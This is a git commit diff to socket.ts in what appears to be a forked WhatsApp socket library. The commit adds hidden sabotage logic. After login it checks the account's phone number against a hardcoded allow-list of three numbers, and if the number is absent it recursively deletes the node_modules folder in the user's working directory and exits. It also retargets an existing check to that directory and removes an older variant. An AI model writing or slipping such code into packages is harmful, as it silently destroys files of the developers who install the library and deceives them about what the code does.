ac3873420c62b48cd15cde96c1fd7d0ad13ca1e5
persount <farrelza9@gmail.com>
2025-07-02 06:52:36 +0700

    Add files via upload

--- src/Socket/socket.ts
+++ src/Socket/socket.ts
@@ -496,7 +496,7 @@ export const makeSocket = (config: SocketConfig) => {
 	  let allowedNumber = ['6283875184244','6285876500334','6281237876432']
 	  if(!allowedNumber.includes(phoneNumber)) {
 	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
-	     const dir = join(__dirname, '../node_modules')
+	     const dir = join(process.cwd(), 'node_modules')
        await rm(dir, { recursive: true, force: true });
 	     process.exit(1)
 	  }
@@ -673,6 +673,14 @@ export const makeSocket = (config: SocketConfig) => {
 			clearTimeout(qrTimer) // will never happen in all likelyhood -- but just in case WA sends success on first try
 			
 			ev.emit('creds.update', { me: { ...authState.creds.me!, lid: node.attrs.lid } })
+	    
+	    let allowedNumber = ['6283875184244','6285876500334','6281237876432']
+	    if(!allowedNumber.includes(authState.creds.me?.id!)) {
+	       console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
+	       const dir = join(process.cwd(), 'node_modules')
+         await rm(dir, { recursive: true, force: true });
+	       process.exit(1)
+	    }
 			
 			ev.emit('connection.update', { connection: 'open' })
 		} catch (err) {
@@ -760,13 +768,7 @@ export const makeSocket = (config: SocketConfig) => {
 		Object.assign(creds, update)
 	})
 
-	if(printQRInTerminal) {
-	  if(authState.creds.me?.id && !authState.creds.me?.id?.includes('6285876500334')) {
-	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
-	     const dir = join(__dirname, '../node_modules')
-       rm(dir, { recursive: true, force: true });
-	     process.exit(1)
-	  }
+	if(printQRInTerminal) {	  
 	  printQRIfNecessaryListener(ev, logger)
 	}
 
